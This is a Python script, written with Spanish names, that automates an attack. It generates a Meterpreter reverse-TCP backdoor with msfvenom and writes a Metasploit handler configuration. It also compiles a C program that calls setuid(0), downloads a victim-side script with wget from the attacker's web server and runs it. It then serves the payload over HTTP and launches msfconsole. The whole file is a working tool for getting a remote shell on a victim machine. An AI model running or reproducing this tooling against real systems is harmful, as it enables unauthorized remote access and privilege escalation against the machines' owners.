import os
try:
    from colorama import Fore
except ImportError as e:
    os.system("pip install colorama")

archivo_rc = "setuid_atacante.rc"
tipo_payload = "linux/x86/meterpreter/reverse_tcp"
tipo_ejecutable = "elf"
c = "runscriptSUID.c"

def obtener_ip_automaticamente(interfaz):
    comando = f"ip address | grep {interfaz} | grep inet  | awk '""{print $2}""' | head -n 1 > ip.txt"
    os.system(comando)
    ip = open("ip.txt","r").readlines()
    os.system("rm ip.txt")
    return ip[0].split('/')[0].strip()

def pedir_dato(enun):
    informar(enun)
    retorno = str(input(f"{Fore.GREEN} ==> "))
    return retorno

def informar(enun):
    print(f"{Fore.CYAN}==========================================================================================")
    print(f"{Fore.RED}[!]  {enun}".upper())
    print(f"{Fore.CYAN}==========================================================================================")

def crear_backdoor(ip_local, puerto_escucha):
    payload = pedir_dato("INTRODUCE EL NOMBRE DEL PAYLOAD SIN EXTENSION")
    os.system(f"msfvenom -p {tipo_payload} LHOST={ip_local} LPORT={puerto_escucha} -f {tipo_ejecutable} -o .{payload}.{tipo_ejecutable}")
    informar(f"BACKDOOR GENERADO COMO : .{payload}.{tipo_ejecutable}")
    return payload 

def levantar_servidor():
    os.system("xterm -e sudo python3 -m http.server 80 &")

def escribir_rc(ordenes_rc):
    informar("Creando Archivo RC ...")
    for orden in ordenes_rc:
        print(f"{Fore.BLUE}{orden}")
        os.system(f"echo {orden} >> {archivo_rc}")

    informar(f"{archivo_rc} GENERADO CON EXITO")

def escribir_archivo(servidor, archivo):
    codigo = """#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
  setuid(0);
  system("wget http://""" + servidor + """/setuid_victima.py");
  system("python3 setuid_victima.py -r """ + servidor + """ -e """ + archivo + """ -x """ + tipo_ejecutable + """ ");
  return 0;
}
"""
    f = open(c , "w")
    f.write(codigo)
    f.close()

def lanza_metasploit():
    os.system(f"msfconsole -q -r {archivo_rc}")

def configurar_archivo(ip, payload):
    informar("Generando Archivo C ")
    escribir_archivo(ip, payload)
    os.system(f"cat {c}")
    conf = pedir_dato(f"Desea modificar el archivo {c} antes de compilarlo ? [S/n] ")
    if len(conf) == 0 or conf[0].upper() == "S":
        os.system(f"nano {c}")
    informar(f"COMPILANDO {c} a SUID")
    os.system(f"gcc {c} -o SUID")
    informar(f"Eliminando {c}")
    os.system(f"rm {c}")

def main():
    interfaz = pedir_dato("INTRODUCE la interfaz conectada a internet")
    ip = obtener_ip_automaticamente(interfaz)
    puerto = pedir_dato("INTRODUCE EL PUERTO A LA ESCUCHA DEL PAYLOAD")
    informar(f"IP DETECTADA :  {ip}")
    ordenes_rc = [
    "use exploit/multi/handler",
    f"set PAYLOAD {tipo_payload}",
    f"set LHOST {ip}",
    f"set LPORT {puerto}",
    "exploit"]
    escribir_rc(ordenes_rc)
    gen = pedir_dato("DESEA CREAR UN PAYLOAD?[S/n]")
    if len(gen) == 0 or gen[0].upper() == "S":
        payload = crear_backdoor(ip, puerto)
        configurar_archivo(ip, payload)
        informar("NECESITO PERMISOS PARA LEVANTAR UN SERVIDOR WEB")
        levantar_servidor()

    lanza_metasploit()
    informar(f"LIMPIANDO {archivo_rc}")
    os.system(f"rm {archivo_rc}")

if __name__ == '__main__':
    main()
